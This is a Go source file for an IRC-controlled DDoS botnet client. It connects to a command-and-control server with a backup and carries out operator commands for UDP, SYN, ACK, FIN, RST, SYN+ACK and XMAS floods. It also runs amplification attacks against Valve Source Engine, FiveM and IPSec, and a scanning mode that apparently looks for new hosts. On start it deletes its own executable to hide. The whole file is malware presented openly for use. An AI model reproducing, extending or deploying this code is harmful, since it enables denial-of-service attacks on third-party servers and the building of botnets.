package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"runtime"

	lib "bot/internal"
)

const (
	IRC_Server        = "" //config IRC server and port here. //ip:port //127.0.0.1:6667
	IRC_Backup_Server = "" //config like main server.
	IRC_Channel       = "" //config channel here. //"#Example"
	IRC_Chan_Password = "" //config channel password here. //If you didn't have, just leave it blank.
	IRC_USNM          = "" //config your IRC username here. //For acces to your bot commands.
)

type reader struct {
	read string
}

func (r *reader) permission() bool {
	return lib.Find(lib.Recv(r.read, 0), IRC_USNM)
}

func run(server string) error {
	conn := lib.Conn(server)
	tp := textproto.NewReader(bufio.NewReader(conn))

	b := &lib.Bot{
		IRC:     conn,
		Channel: IRC_Channel,
		ChanKey: IRC_Chan_Password,
	}
	b.Login()

	for {
		ircRead, err := tp.ReadLine()
		if err != nil {
			return err
		}
		r := &reader{
			read: ircRead,
		}

		go func() {
			if lib.Find(ircRead, "PING :") {
				b.Send("PONG " + lib.Recv(ircRead, 1))
			}
		}()

		//Check is user modes and Join IRC channel
		if lib.Find(ircRead, "+i") || lib.Find(ircRead, "+w") || lib.Find(ircRead, "+x") {
			b.Send(fmt.Sprint("JOIN " + IRC_Channel + IRC_Chan_Password))
		}

		switch {
		case lib.Find(ircRead, "?udp") && r.permission():
			/*
				UDP Flood
			*/
			lib.AttackSwitch = false
			go b.UDP(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
			b.Report("🗡 START UDP FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?syn") && r.permission():
			/*
				SYN Flood
			*/
			lib.AttackSwitch = false
			go b.SYN(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
			b.Report("🗡 START SYN FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?ack") && r.permission():
			/*
				ACK Flood
			*/
			lib.AttackSwitch = false
			go b.ACK(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
			b.Report("🗡 START ACK FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?fin") && r.permission():
			/*
				FIN Flood
			*/
			lib.AttackSwitch = false
			go b.FIN(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
			b.Report("🗡 START FIN FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?rst") && r.permission():
			/*
				RST Flood
			*/
			lib.AttackSwitch = false
			go b.RST(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
			b.Report("🗡 START RST FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?sap") && r.permission():
			/*
				SYN+ACK packet Flood
			*/
			lib.AttackSwitch = false
			go b.SAP(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
			b.Report("🗡 START SAP FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?xmas") && r.permission():
			/*
				XMAS Flood
			*/
			lib.AttackSwitch = false
			go b.XMAS(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
			b.Report("🗡 START XMAS FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?vse") && r.permission():
			/*
				Valve Source Engine Amplification
			*/
			lib.AttackSwitch = false
			go b.VSE(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
			b.Report("🗡 START VSE ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?fms") && r.permission():
			/*
				FiveM Server Amplification
			*/
			lib.AttackSwitch = false
			go b.FMS(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
			b.Report("🗡 START FMS ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?ipsec") && r.permission():
			/*
				IPSec Amplification
			*/
			lib.AttackSwitch = false
			go b.IPSEC(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
			b.Report("🗡 START IPSEC ATTACK TO: " + lib.Recv(ircRead, 5))
		case lib.Find(ircRead, "?scan") && r.permission():
			/*
				Bot Scanner
			*/
			lib.ScanSwitch = false
			go b.ScanMode(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
			b.Report("👁 START SCANNING.")
		case lib.Find(ircRead, "?info") && r.permission():
			/*
				Bot infomation
			*/
			b.ReportInfo()
		case lib.Find(ircRead, "?kill") && r.permission():
			/*
				Bot self-close
			*/
			os.Exit(0)
		case lib.Find(ircRead, "?stopddos") && r.permission():
			/*
				Stop ddos attacking
			*/
			lib.ReportSwitch = true
			lib.AttackSwitch = true
		case lib.Find(ircRead, "?stopscan") && r.permission():
			/*
				Stop scanning
			*/
			lib.ScanSwitch = true
		}
	}
}

func main() {
	os.Remove(os.Args[0])
	if runtime.GOOS != "linux" {
		os.Exit(0)
	}
	if run(IRC_Server) != nil {
		for {
			if run(IRC_Backup_Server) == nil {
				break
			}
		}
	}
}
